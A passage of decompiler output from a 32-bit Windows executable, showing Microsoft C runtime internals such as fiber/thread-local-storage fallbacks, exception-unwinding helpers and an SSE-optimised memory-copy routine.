    int32_t * v10 = &v9; // 0x40888b
    if (hModule != 0) {
        // 0x40888d
        v5 = hModule;
        int32_t (*func)() = GetProcAddress((int32_t *)hModule, lpProcName); // 0x408891
        v10 = &v5;
        if (func != NULL) {
            int32_t result2 = (int32_t)func; // 0x408891
            *v1 = function_406100(result2);
            // 0x4088b7
            return result2;
        }
    }
    // 0x4088aa
    *(int32_t *)((int32_t)v10 - 4) = -1;
    *v1 = function_406100((int32_t)&g266);
    // 0x4088b7
    return 0;
}

// Address range: 0x4088ba - 0x4088f5
int32_t function_4088ba(int32_t a1) {
    // 0x4088ba
    int32_t v1; // 0x4088ba
    int32_t v2; // 0x4088ba
    if (function_40884b(0, "FlsAlloc", &g25, "FlsAlloc", v1, v2) == 0) {
        // 0x4088ed
        return TlsAlloc();
    }
    // 0x4088dd
    return function_406b3d();
}

// Address range: 0x4088f5 - 0x408930
int32_t function_4088f5(int32_t dwTlsIndex) {
    // 0x4088f5
    int32_t result; // 0x4088f5
    int32_t v1; // 0x4088f5
    int32_t v2; // 0x4088f5
    if (function_40884b(1, "FlsFree", &g26, "FlsFree", v1, v2) == 0) {
        // 0x408927
        result = TlsFree(dwTlsIndex);
    } else {
        // 0x40891b
        result = function_406b3d();
    }
    // 0x40892d
    return result;
}

// Address range: 0x408930 - 0x40896b
int32_t function_408930(int32_t dwTlsIndex) {
    // 0x408930
    int32_t result; // 0x408930
    int32_t v1; // 0x408930
    int32_t v2; // 0x408930
    if (function_40884b(2, "FlsGetValue", &g27, "FlsGetValue", v1, v2) == 0) {
        // 0x408962
        result = (int32_t)TlsGetValue(dwTlsIndex);
    } else {
        // 0x408956
        result = function_406b3d();
    }
    // 0x408968
    return result;
}

// Address range: 0x40896b - 0x4089a9
int32_t function_40896b(int32_t dwTlsIndex, int32_t lpTlsValue) {
    // 0x40896b
    int32_t result; // 0x40896b
    int32_t v1; // 0x40896b
    int32_t v2; // 0x40896b
    if (function_40884b(3, "FlsSetValue", &g28, "FlsSetValue", v1, v2) == 0) {
        // 0x4089a0
        result = TlsSetValue(dwTlsIndex, (int32_t *)lpTlsValue);
    } else {
        // 0x408994
        result = function_406b3d();
    }
    // 0x4089a6
    return result;
}

// Address range: 0x4089a9 - 0x4089f0
int32_t function_4089a9(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3) {
    // 0x4089a9
    int32_t v1; // 0x4089a9
    int32_t v2; // 0x4089a9
    int32_t v3 = function_40884b(4, "InitializeCriticalSectionEx", (int32_t *)&g29, "InitializeCriticalSectionEx", v1, v2); // 0x4089be
    int32_t result; // 0x4089a9
    if (v3 == 0) {
        // 0x4089e1
        result = InitializeCriticalSectionAndSpinCount((struct _RTL_CRITICAL_SECTION *)lpCriticalSection, dwSpinCount);
    } else {
        // 0x4089cc
        result = function_406b3d();
    }
    // 0x4089ed
    return result;
}

// Address range: 0x4089f0 - 0x408a19
int32_t function_4089f0(void) {
    int32_t result = &g182; // 0x408a0a
    int32_t v1 = 0; // 0x408a0a
    v1++;
    *(int32_t *)result = g112;
    result += 4;
    while (v1 != ((int32_t)&g183 - ((int32_t)&g183 + (int32_t)(&g183 < &g182)) & -5) + 5) {
        // 0x408a0d
        v1++;
        *(int32_t *)result = g112;
        result += 4;
    }
    // 0x408a17
    return result;
}

// Address range: 0x408a19 - 0x408a4b
int32_t function_408a19(int32_t a1) {
    int32_t result; // 0x408a19
    if ((char)a1 != 0) {
        // 0x408a49
        return result;
    }
    // 0x408a22
    int32_t v1; // bp-8, 0x408a19
    int32_t v2 = &v1; // 0x408a23
    int32_t v3 = (int32_t)&g181; // 0x408a23
    int32_t v4; // 0x408a19
    int32_t v5; // 0x408a19
    int32_t v6; // 0x408a19
    int32_t * v7; // 0x408a28
    int32_t v8; // 0x408a32
    while (true) {
      lab_0x408a28:;
        int32_t v9 = v2;
        v7 = (int32_t *)v3;
        int32_t v10 = *v7; // 0x408a28
        v8 = v9;
        v5 = v4;
        v2 = v9;
        v6 = v4;
        switch (v10) {
            case 0: {
                goto lab_0x408a3d;
            }
            case -1: {
                goto lab_0x408a3a;
            }
            default: {
                // 0x408a32
                v8 = v9 - 4;
                *(int32_t *)v8 = v10;
                v5 = FreeLibrary(&g266);
                goto lab_0x408a3a;
            }
        }
    }
    // 0x408a49
    return result;
  lab_0x408a3d:
    // 0x408a3d
    v3 += 4;
    v4 = v6;
    result = v6;
    if (v3 == (int32_t)&g182) {
        return result;
    }
    goto lab_0x408a28;
  lab_0x408a3a:
    // 0x408a3a
    *v7 = 0;
    v2 = v8;
    v6 = v5;
    goto lab_0x408a3d;
}

// Address range: 0x408a4b - 0x408a56
int32_t function_408a4b(void) {
    // 0x408a4b
    g183 = g112;
    return g112;
}

// Address range: 0x408a60 - 0x408af0
int32_t function_408a60(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-40, 0x408a79
    int32_t v2 = &v1; // 0x408a79
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x408a8b
    int32_t v4; // 0x408a60
    int32_t result; // 0x408a92
    while (true) {
        // 0x408a92
        v4 = v3;
        int32_t * v5 = (int32_t *)(v4 + 44); // 0x408a99
        result = *(int32_t *)(v4 + 48);
        int32_t * v6 = (int32_t *)(result + 12); // 0x408a9f
        uint32_t v7 = *v6; // 0x408a9f
        if (v7 == -2) {
            // break (via goto) -> 0x408ae2
            goto lab_0x408ae2_2;
        }
        uint32_t v8 = *(int32_t *)(v4 + 52); // 0x408aa7
        if (v8 != -2 && v7 <= v8) {
            // break (via goto) -> 0x408ae2
            goto lab_0x408ae2_2;
        }
        int32_t v9 = (*(int32_t *)*v5 ^ *(int32_t *)(result + 8)) + 16 + 12 * v7; // 0x408ab7
        *v6 = *(int32_t *)v9;
        while (*(int32_t *)(v9 + 4) != 0) {
            // 0x408a92
            result = *(int32_t *)(v4 + 48);
            v6 = (int32_t *)(result + 12);
            v7 = *v6;
            if (v7 == -2) {
                // break (via goto) -> 0x408ae2
                goto lab_0x408ae2_2;
            }
            // 0x408aa7
            v8 = *(int32_t *)(v4 + 52);
            if (v8 != -2 && v7 <= v8) {
                // break (via goto) -> 0x408ae2
                goto lab_0x408ae2_2;
            }
            // 0x408ab4
            v9 = (*(int32_t *)*v5 ^ *(int32_t *)(result + 8)) + 16 + 12 * v7;
            *v6 = *(int32_t *)v9;
        }
        // 0x408ac6
        v3 = v4 - 4;
        *(int32_t *)v3 = 257;
        function_408cec((int32_t)&g266);
        function_408d0b();
    }
  lab_0x408ae2_2:
    // 0x408ae2
    __writefsdword(0, *(int32_t *)v4);
    return result;
}

// Address range: 0x408af0 - 0x408b36
int32_t function_408af0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = 1; // 0x408b00
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        int32_t v1 = function_406b2c(); // 0x408b0b
        int32_t v2 = *(int32_t *)(v1 + 20); // 0x408b1a
        function_408a60(v2, *(int32_t *)(v1 + 16), *(int32_t *)(v1 + 12));
        *(int32_t *)a3 = a2;
        result = 3;
    }
    // 0x408b35
    return result;
}

// Address range: 0x408b38 - 0x408b60
int32_t function_408b38(int32_t a1) {
    // 0x408b38
    int32_t v1; // 0x408b38
    function_4086ed(a1, v1);
    int32_t v2 = *(int32_t *)(a1 + 40); // 0x408b51
    return function_408a60(v2, *(int32_t *)(a1 + 24), *(int32_t *)(a1 + 28));
}

// Address range: 0x408b60 - 0x408b77
int32_t function_408b60(int32_t a1) {
    // 0x408b60
    return 0;
}

// Address range: 0x408b78 - 0x408b91
int32_t function_408b78(void) {
    // 0x408b78
    function_408cec(1);
    return 0;
}

// Address range: 0x408b94 - 0x408bae
int32_t function_408b94(void) {
    // 0x408b94
    int32_t ExceptionRecord; // 0x408b94
    int32_t TargetFrame; // 0x408b94
    RtlUnwind((int32_t *)TargetFrame, &g2, (struct _EXCEPTION_RECORD *)ExceptionRecord, NULL);
    return &g266;
}

// Address range: 0x408bb0 - 0x408bc7
int32_t function_408bb0(int32_t a1, int32_t * a2) {
    // 0x408bb0
    int32_t v1; // 0x408bb0
    int32_t v2; // 0x408bb0
    return function_408a60((int32_t)a2, v2, v1);
}

// Address range: 0x408bd0 - 0x408bf1
int32_t function_408bd0(int32_t TargetFrame) {
    // 0x408bd0
    RtlUnwind((int32_t *)TargetFrame, &g3, NULL, NULL);
    return &g266;
}

// Address range: 0x408bf1 - 0x408c36
int32_t function_408bf1(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t result = 1; // 0x408c01
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        int32_t v1 = function_406b2c(); // 0x408c0c
        int32_t v2; // 0x408bf1
        function_408c36(*(int32_t *)(v1 + 36), *(int32_t *)(v1 + 40), v2);
        *(int32_t *)a3 = a2;
        result = 3;
    }
    // 0x408c35
    return result;
}

// Address range: 0x408c36 - 0x408cba
int32_t function_408c36(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x408c46
    int32_t v2 = &v1; // 0x408c46
    int32_t v3 = g112 ^ v2; // bp-36, 0x408c54
    int32_t v4 = &v3; // 0x408c54
    __writefsdword(0, v2);
    int32_t result = *(int32_t *)(v4 + 40); // 0x408c5f
    int32_t * v5 = (int32_t *)(result + 12); // 0x408c66
    int32_t v6 = *v5; // 0x408c66
    int32_t v7 = v6; // 0x408c6c
    int32_t * v8 = v5; // 0x408c6c
    int32_t v9 = result; // 0x408c6c
    if (v6 == -1) {
        // 0x408ca8
        __writefsdword(0, *(int32_t *)(v4 + 4));
        return result;
    }
    int32_t v10 = v4;
    uint32_t v11 = *(int32_t *)(v10 + 44); // 0x408c6e
    int32_t v12 = v10; // 0x408c73
    int32_t result2 = v9; // 0x408c73
    while (v11 == -1 || v7 > v11) {
        int32_t v13 = *(int32_t *)(v9 + 8) + 12 * v7;
        int32_t v14 = *(int32_t *)v13; // 0x408c7e
        *(int32_t *)(v10 + 12) = v14;
        *v8 = v14;
        int32_t v15 = v10; // 0x408c8d
        if (*(int32_t *)(v13 + 4) == 0) {
            // 0x408c8f
            v15 = v10 - 4;
            *(int32_t *)v15 = 257;
            function_408cec((int32_t)&g266);
            function_408d0b();
        }
        // 0x408ca6
        v9 = *(int32_t *)(v15 + 40);
        v8 = (int32_t *)(v9 + 12);
        v7 = *v8;
        v12 = v15;
        result2 = v9;
        if (v7 == -1) {
            // break -> 0x408ca8
            break;
        }
        v10 = v15;
        v11 = *(int32_t *)(v10 + 44);
        v12 = v10;
        result2 = v9;
    }
    // 0x408ca8
    __writefsdword(0, *(int32_t *)(v12 + 4));
    return result2;
}

// Address range: 0x408cba - 0x408cdd
int32_t function_408cba(void) {
    int32_t v1 = __readfsdword(0); // 0x408cbc
    if (*(int32_t *)(v1 + 4) != 0x408bf1) {
        // 0x408cdc
        return 0;
    }
    int32_t v2 = *(int32_t *)(*(int32_t *)(v1 + 12) + 12); // 0x408ccf
    return *(int32_t *)(v1 + 8) == v2;
}

// Address range: 0x408ce0 - 0x408ce9
int32_t function_408ce0(int32_t a1, int32_t * a2) {
    // 0x408ce0
    int32_t v1; // 0x408ce0
    int32_t v2; // 0x408ce0
    return function_408cf7(v2, v1);
}

// Address range: 0x408cec - 0x408cf7
int32_t function_408cec(int32_t a1) {
    // 0x408cec
    int32_t result; // 0x408cec
    return result;
}

// Address range: 0x408cf7 - 0x408d0b
int32_t function_408cf7(int32_t a1, int32_t a2) {
    // 0x408cf7
    int32_t result; // 0x408cf7
    return result;
}

// Address range: 0x408d0b - 0x408d0e
int32_t function_408d0b(void) {
    // 0x408d0b
    int32_t result; // 0x408d0b
    return result;
}

// Address range: 0x408d0e - 0x408d2a
int32_t function_408d0e(void) {
    // 0x408d0e
    if (*(int32_t *)(function_4078e2() + 4) != 0) {
        // 0x408d1b
        function_406b3d();
    }
    // 0x408d25
    function_40ae16();
    // UNREACHABLE
}

// Address range: 0x408d2b - 0x408db8
int32_t function_408d2b(void) {
    // 0x408d2b
    function_406cf0(&g86, 8, (int32_t)&g266);
    int32_t v1; // 0x408d2b
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x408d37
    int32_t result; // 0x408db2
    if (v2 == 0 || *(int32_t *)v2 != -0x1f928c9d || *(int32_t *)(v2 + 16) != 3) {
        // 0x408db2
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v3 = *(int32_t *)(v2 + 20); // 0x408d4c
    if ((v3 & -2) != 0x19930520 == (v3 != 0x19930522)) {
        // 0x408db2
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v4 = *(int32_t *)(v2 + 28); // 0x408d67
    if (v4 == 0) {
        // 0x408db2
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v5 = *(int32_t *)(v4 + 4); // 0x408d6e
    if (v5 != 0) {
        int32_t * v6 = (int32_t *)(v1 - 4); // 0x408d75
        *v6 = 0;
        function_408dc1(*(int32_t *)(v2 + 24), v5);
        *v6 = -2;
        // 0x408db2
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x408d94
    if ((*(char *)v4 & 16) == 0) {
        // 0x408db2
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x408d99
    if (*(int32_t *)*(int32_t *)(v2 + 24) != 0) {
        // 0x408da2
        function_406b3d();
    }
    // 0x408db2
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x408dc1 - 0x408dce
int32_t function_408dc1(int32_t a1, int32_t a2) {
    // 0x408dc1
    int32_t result; // 0x408dc1
    return result;
}

// Address range: 0x408dce - 0x408df4
int32_t function_408dce(int32_t a1) {
    int32_t v1 = *(int32_t *)(function_4078e2() + 36); // 0x408dd6
    if (v1 == 0) {
        // 0x408deb
        return 1;
    }
    int32_t v2 = v1; // 0x408ddb
    int32_t result = 0; // 0x408de2
    while (*(int32_t *)v2 != a1) {
        // 0x408de4
        v2 += 4;
        result = 1;
        if (v2 == 0) {
            // break -> 0x408deb
            break;
        }
        result = 0;
    }
    // 0x408deb
    return result;
}

// Address range: 0x408df4 - 0x408e19
int32_t function_408df4(int32_t a1, int32_t a2) {
    uint32_t v1 = *(int32_t *)(a2 + 4); // 0x408e00
    int32_t v2 = *(int32_t *)a2 + a1; // 0x408e03
    int32_t result = v2; // 0x408e07
    if (v1 >= 0) {
        int32_t v3 = *(int32_t *)(*(int32_t *)(v1 + a1) + *(int32_t *)(a2 + 8)); // 0x408e0f
        result = v2 + v1 + v3;
    }
    // 0x408e16
    return result;
}

// Address range: 0x408e19 - 0x408e5e
int32_t function_408e19(int32_t a1) {
    int32_t v1 = *(int32_t *)*(int32_t *)a1; // 0x408e21
    switch (v1) {
        case -0x1fbcbcae: {
        }
        case -0x1fbcb0b3: {
            // 0x408e47
            if (*(int32_t *)(function_4078e2() + 24) >= 1) {
                int32_t * v2 = (int32_t *)(function_4078e2() + 24); // 0x408e57
                *v2 = *v2 - 1;
            }
            // break -> 0x408e5a
            break;
        }
        default: {
            if (v1 == -0x1f928c9d) {
                // 0x408e39
                *(int32_t *)(function_4078e2() + 24) = 0;
                function_40ae16();
                // UNREACHABLE
            }
            // break -> 0x408e5a
            break;
        }
    }
    // 0x408e5a
    return 0;
}

// Address range: 0x408e60 - 0x4093d4
int32_t function_408e60(int32_t result, int32_t a2, int32_t a3) {
    int32_t v1 = a3 + a2; // 0x408e72
    if (result > a2 == v1 > result) {
        int32_t v2 = a3 + result; // 0x409117
        int32_t v3 = a3; // 0x40911d
        int32_t v4 = v1; // 0x40911d
        int32_t v5 = v2; // 0x40911d
        if (a3 >= 32) {
            // 0x409123
            if ((g114 & 2) == 0) {
                int32_t v6 = v2 & 3; // 0x409131
                int32_t v7 = a3; // 0x409137
                int32_t v8 = v1; // 0x409137
                int32_t v9 = v2; // 0x409137
                if (v6 != 0) {
                    int32_t v10 = v1 - 1; // 0x409140
                    int32_t v11 = v2 - 1; // 0x409143
                    *(char *)v11 = *(char *)v10;
                    int32_t v12 = v6 - 1; // 0x409148
                    int32_t v13 = v12; // 0x40914b
                    int32_t v14 = v10; // 0x40914b
                    int32_t v15 = v11; // 0x40914b
                    while (v12 != 0) {
                        // 0x409140
                        v10 = v14 - 1;
                        v11 = v15 - 1;
                        *(char *)v11 = *(char *)v10;
                        v12 = v13 - 1;
                        v13 = v12;
                        v14 = v10;
                        v15 = v11;
                    }
                    // 0x409156
                    v7 = a3 - v6;
                    v8 = v10;
                    v9 = v11;
                }
                // 0x409156
                __asm_rep_movsd_memcpy((char *)(v9 - 4), (char *)(v8 - 4), v7 / 4);
                g262 = v7 & 3;
                // 0x4090d4
                return result;
            }
            int32_t v16 = a3; // 0x4091cb
            int32_t v17 = v1; // 0x4091cb
            int32_t v18 = v2; // 0x4091cb
            if ((v2 & 15) != 0) {
                int32_t v19 = a3 - 1; // 0x4091cd
                int32_t v20 = v1 - 1; // 0x4091ce
                int32_t v21 = v2 - 1; // 0x4091cf
                *(char *)v21 = *(char *)v20;
                int32_t v22 = v19; // 0x4091da
                int32_t v23 = v20; // 0x4091da
                int32_t v24 = v21; // 0x4091da
                v16 = v19;
                v17 = v20;
                v18 = v21;
                while ((v21 & 15) != 0) {
                    // 0x4091cd
                    v19 = v22 - 1;
                    v20 = v23 - 1;
                    v21 = v24 - 1;
                    *(char *)v21 = *(char *)v20;
                    v22 = v19;
                    v23 = v20;
                    v24 = v21;
                    v16 = v19;
                    v17 = v20;
                    v18 = v21;
                }
            }
            int32_t v25 = v16; // 0x40923e
            int32_t v26 = v18;
            int32_t v27 = v17;
            int32_t v28 = v25; // 0x4091e2
            int32_t v29 = v27; // 0x4091e2
            int32_t v30 = v26; // 0x4091e2
            while (v25 >= 128) {
                int32_t v31 = v27 - 128; // 0x4091e4
                int32_t v32 = v26 - 128; // 0x4091ea
                int128_t v33 = __asm_movdqu_6(*(int128_t *)v31); // 0x4091f0
                int128_t v34 = __asm_movdqu_6(*(int128_t *)(v27 - 112)); // 0x4091f4
                int128_t v35 = __asm_movdqu_6(*(int128_t *)(v27 - 96)); // 0x4091f9
                int128_t v36 = __asm_movdqu_6(*(int128_t *)(v27 - 80)); // 0x4091fe
                int128_t v37 = __asm_movdqu_6(*(int128_t *)(v27 - 64)); // 0x409203
                int128_t v38 = __asm_movdqu_6(*(int128_t *)(v27 - 48)); // 0x409208
                int128_t v39 = __asm_movdqu_6(*(int128_t *)(v27 - 32)); // 0x40920d
                int128_t v40 = __asm_movdqu_6(*(int128_t *)(v27 - 16)); // 0x409212
                __asm_movdqu(*(int128_t *)v32, v33);
                __asm_movdqu(*(int128_t *)(v26 - 112), v34);
                __asm_movdqu(*(int128_t *)(v26 - 96), v35);
                __asm_movdqu(*(int128_t *)(v26 - 80), v36);
                __asm_movdqu(*(int128_t *)(v26 - 64), v37);
                __asm_movdqu(*(int128_t *)(v26 - 48), v38);
                __asm_movdqu(*(int128_t *)(v26 - 32), v39);
                __asm_movdqu(*(int128_t *)(v26 - 16), v40);
                v25 -= 128;
                v28 = v25;
                v29 = v31;
                v30 = v32;
                if (v25 < 128) {
                    // break -> 0x40924c
                    break;
                }
                v26 = v32;
                v27 = v31;
                v28 = v25;
                v29 = v27;
                v30 = v26;
            }
            // 0x40924c
            v3 = v28;
            v4 = v29;
            v5 = v30;
            if (v28 >= 32) {
                int32_t v41 = v29 - 32; // 0x409251
                int32_t v42 = v30 - 32; // 0x409254
                int128_t v43 = __asm_movdqu_6(*(int128_t *)v41); // 0x409257
                int128_t v44 = __asm_movdqu_6(*(int128_t *)(v29 - 16)); // 0x40925b
                __asm_movdqu(*(int128_t *)v42, v43);
                __asm_movdqu(*(int128_t *)(v30 - 16), v44);
                int32_t v45 = v28 - 32; // 0x409269
                int32_t v46 = v45; // 0x409272
                int32_t v47 = v41; // 0x409272
                int32_t v48 = v42; // 0x409272
                v3 = v45;
                v4 = v41;
                v5 = v42;
                while (v45 >= 32) {
                    // 0x409251
                    v41 = v47 - 32;
                    v42 = v48 - 32;
                    v43 = __asm_movdqu_6(*(int128_t *)v41);
                    v44 = __asm_movdqu_6(*(int128_t *)(v47 - 16));
                    __asm_movdqu(*(int128_t *)v42, v43);
                    __asm_movdqu(*(int128_t *)(v48 - 16), v44);
                    v45 = v46 - 32;
                    v46 = v45;
                    v47 = v41;
                    v48 = v42;
                    v3 = v45;
                    v4 = v41;
                    v5 = v42;
                }
            }
        }
        int32_t v49 = v3; // 0x40927a
        int32_t v50 = v4; // 0x40927a
        int32_t v51 = v5; // 0x40927a
        if (v3 >= 4) {
            int32_t v52 = v5 - 4; // 0x40927c
            int32_t v53 = v4 - 4; // 0x40927f
            *(int32_t *)v52 = *(int32_t *)v53;
            int32_t v54 = v3 - 4; // 0x409286
            int32_t v55 = v54; // 0x40928f
            int32_t v56 = v53; // 0x40928f
            int32_t v57 = v52; // 0x40928f
            v49 = v54;
            v50 = v53;
            v51 = v52;
            while (v54 >= 4) {
                // 0x40927c
                v52 = v57 - 4;
                v53 = v56 - 4;
                *(int32_t *)v52 = *(int32_t *)v53;
                v54 = v55 - 4;
                v55 = v54;
                v56 = v53;
                v57 = v52;
                v49 = v54;
                v50 = v53;
                v51 = v52;
            }
        }
        int32_t v58 = v49; // 0x409293
        int32_t v59 = v50; // 0x409293
        if (v49 == 0) {
            // 0x4090d4
            return result;
        }
        int32_t v60 = v51; // 0x409293
        v60--;
        v59--;
        *(char *)v60 = *(char *)v59;
        v58--;
        while (v58 != 0) {
            // 0x409295
            v60--;
            v59--;
            *(char *)v60 = *(char *)v59;
            v58--;
        }
        // 0x4090d4
        return result;
    }
    int32_t v61 = a3; // 0x408e83
    int32_t v62 = a2; // 0x408e83
    int32_t v63 = result; // 0x408e83
    int32_t v64; // 0x408e60
    int32_t v65; // 0x408e60
    int32_t v66; // 0x408e60
    int32_t v67; // bp-8, 0x408e60
    if (a3 < 32) {
        goto lab_0x40935b;
    } else {
        if (a3 >= 128) {
            // 0x408ea4
            if ((g163 & 2) != 0) {
                // 0x408eae
                __asm_rep_movsb_memcpy((char *)result, (char *)a2, a3);
                return result;
            }
            if (((a2 ^ result) & 15) != 0) {
                goto lab_0x408ed0;
            } else {
                // 0x408ec2
                if ((g114 & 2) == 0) {
                    goto lab_0x408ed0;
                } else {
                    int32_t v68 = a2 & 15; // 0x4092b2
                    int32_t v69 = a3; // 0x4092b7
                    int32_t v70 = a2; // 0x4092b7
                    int32_t v71 = result; // 0x4092b7
                    if (v68 != 0) {
                        uint32_t v72 = 16 - v68; // 0x4093a5
                        int32_t v73 = v72 & 3; // 0x4093ae
                        int32_t v74 = a2; // 0x4093b1
                        int32_t v75 = result; // 0x4093b1
                        if (v73 != 0) {
                            *(char *)result = *(char *)a2;
                            int32_t v76 = a2 + 1; // 0x4093b7
                            int32_t v77 = result + 1; // 0x4093b8
                            int32_t v78 = v73 - 1; // 0x4093b9
                            int32_t v79 = v78; // 0x4093ba
                            int32_t v80 = v76; // 0x4093ba
                            int32_t v81 = v77; // 0x4093ba
                            v74 = v76;
                            v75 = v77;
                            while (v78 != 0) {
                                // 0x4093b3
                                *(char *)v81 = *(char *)v80;
                                v76 = v80 + 1;
                                v77 = v81 + 1;
                                v78 = v79 - 1;
                                v79 = v78;
                                v80 = v76;
                                v81 = v77;
                                v74 = v76;
                                v75 = v77;
                            }
                        }
                        int32_t v82 = a3 - v72; // 0x4093a7
                        v69 = v82;
                        v70 = v74;
                        v71 = v75;
                        if (v72 >= 4) {
                            *(int32_t *)v75 = *(int32_t *)v74;
                            int32_t v83 = v74 + 4; // 0x4093c5
                            int32_t v84 = v75 + 4; // 0x4093c8
                            int32_t v85 = v72 / 4 - 1; // 0x4093cb
                            v69 = v82;
                            v70 = v83;
                            v71 = v84;
                            int32_t v86 = v85; // 0x4093cc
                            int32_t v87 = v83; // 0x4093cc
                            int32_t v88 = v84; // 0x4093cc
                            while (v85 != 0) {
                                // 0x4093c1
                                *(int32_t *)v88 = *(int32_t *)v87;
                                v83 = v87 + 4;
                                v84 = v88 + 4;
                                v85 = v86 - 1;
                                v69 = v82;
                                v70 = v83;
                                v71 = v84;
                                v86 = v85;
                                v87 = v83;
                                v88 = v84;
                            }
                        }
                    }
                    int32_t v89 = v70; // 0x4092c5
                    int32_t v90 = v71; // 0x4092c5
                    if (v69 >= 128) {
                        int128_t v91 = __asm_movdqa_5(*(int128_t *)v70); // 0x4092d0
                        int128_t v92 = __asm_movdqa_5(*(int128_t *)(v70 + 16)); // 0x4092d4
                        int128_t v93 = __asm_movdqa_5(*(int128_t *)(v70 + 32)); // 0x4092d9
                        int128_t v94 = __asm_movdqa_5(*(int128_t *)(v70 + 48)); // 0x4092de
                        __asm_movdqa(*(int128_t *)v71, v91);
                        __asm_movdqa(*(int128_t *)(v71 + 16), v92);
                        __asm_movdqa(*(int128_t *)(v71 + 32), v93);
                        __asm_movdqa(*(int128_t *)(v71 + 48), v94);
                        int128_t v95 = __asm_movdqa_5(*(int128_t *)(v70 + 64)); // 0x4092f6
                        int128_t v96 = __asm_movdqa_5(*(int128_t *)(v70 + 80)); // 0x4092fb
                        int128_t v97 = __asm_movdqa_5(*(int128_t *)(v70 + 96)); // 0x409300
                        int128_t v98 = __asm_movdqa_5(*(int128_t *)(v70 + 112)); // 0x409305
                        __asm_movdqa(*(int128_t *)(v71 + 64), v95);
                        __asm_movdqa(*(int128_t *)(v71 + 80), v96);
                        __asm_movdqa(*(int128_t *)(v71 + 96), v97);
                        __asm_movdqa(*(int128_t *)(v71 + 112), v98);
                        int32_t v99 = v70 + 128; // 0x40931e
                        int32_t v100 = v71 + 128; // 0x409324
                        int32_t v101 = v69 / 128 - 1; // 0x40932a
                        int32_t v102 = v101; // 0x40932b
                        int32_t v103 = v99; // 0x40932b
                        int32_t v104 = v100; // 0x40932b
                        v89 = v99;
                        v90 = v100;
                        while (v101 != 0) {
                            // 0x4092d0
                            v91 = __asm_movdqa_5(*(int128_t *)v103);
                            v92 = __asm_movdqa_5(*(int128_t *)(v103 + 16));
                            v93 = __asm_movdqa_5(*(int128_t *)(v103 + 32));
                            v94 = __asm_movdqa_5(*(int128_t *)(v103 + 48));
                            __asm_movdqa(*(int128_t *)v104, v91);
                            __asm_movdqa(*(int128_t *)(v104 + 16), v92);
                            __asm_movdqa(*(int128_t *)(v104 + 32), v93);
                            __asm_movdqa(*(int128_t *)(v104 + 48), v94);
                            v95 = __asm_movdqa_5(*(int128_t *)(v103 + 64));
                            v96 = __asm_movdqa_5(*(int128_t *)(v103 + 80));
                            v97 = __asm_movdqa_5(*(int128_t *)(v103 + 96));
                            v98 = __asm_movdqa_5(*(int128_t *)(v103 + 112));
                            __asm_movdqa(*(int128_t *)(v104 + 64), v95);
                            __asm_movdqa(*(int128_t *)(v104 + 80), v96);
                            __asm_movdqa(*(int128_t *)(v104 + 96), v97);
                            __asm_movdqa(*(int128_t *)(v104 + 112), v98);
                            v99 = v103 + 128;
                            v100 = v104 + 128;
                            v101 = v102 - 1;
                            v102 = v101;
                            v103 = v99;
                            v104 = v100;
                            v89 = v99;
                            v90 = v100;
                        }
                    }
                    int32_t v105 = v69 & 127; // 0x4092bf
                    v65 = v90;
                    v66 = v89;
                    v64 = v105;
                    if (v105 == 0) {
                        // 0x409390
                        return *(int32_t *)((int32_t)&v67 + 12);
                    }
                    goto lab_0x409331;
                }
            }
        } else {
            // 0x408e91
            v65 = result;
            v66 = a2;
            v64 = a3;
            if ((g114 & 2) == 0) {
                goto lab_0x409087;
            } else {
                goto lab_0x409331;
            }
        }
    }
  lab_0x40935b:;
    uint32_t v106 = v61 & 31; // 0x40935b
    if (v106 == 0) {
        // 0x409390
        return *(int32_t *)((int32_t)&v67 + 12);
    }
    int32_t v107 = v62; // 0x409365
    int32_t v108 = v63; // 0x409365
    if (v106 >= 4) {
        *(int32_t *)v63 = *(int32_t *)v62;
        int32_t v109 = v63 + 4; // 0x40936b
        int32_t v110 = v62 + 4; // 0x40936e
        int32_t v111 = v106 / 4 - 1; // 0x409371
        int32_t v112 = v111; // 0x409374
        int32_t v113 = v110; // 0x409374
        int32_t v114 = v109; // 0x409374
        v107 = v110;
        v108 = v109;
        while (v111 != 0) {
            // 0x409367
            *(int32_t *)v114 = *(int32_t *)v113;
            v109 = v114 + 4;
            v110 = v113 + 4;
            v111 = v112 - 1;
            v112 = v111;
            v113 = v110;
            v114 = v109;
            v107 = v110;
            v108 = v109;
        }
    }
    int32_t v115 = v61 & 3; // 0x409378
    int32_t v116 = v107; // 0x40937b
    if (v115 == 0) {
        // 0x409390
        return *(int32_t *)((int32_t)&v67 + 12);
    }
    int32_t v117 = v108; // 0x40937b
    *(char *)v117 = *(char *)v116;
    int32_t v118 = v115 - 1; // 0x409383
    int32_t v119 = v118; // 0x409384
    v116++;
    v117++;
    while (v118 != 0) {
        // 0x40937d
        *(char *)v117 = *(char *)v116;
        v118 = v119 - 1;
        v119 = v118;
        v116++;
        v117++;
    }
    // 0x409390
    return *(int32_t *)((int32_t)&v67 + 12);
  lab_0x408ed0:;
    int32_t v120; // 0x408e60
    int32_t v121; // 0x408e60
    int32_t v122; // 0x408e60
    int32_t v123; // 0x408e60
    int32_t v124; // 0x408e60
    int32_t v125; // 0x408e60
    int32_t v126; // 0x408e60
    int32_t v127; // 0x408e60
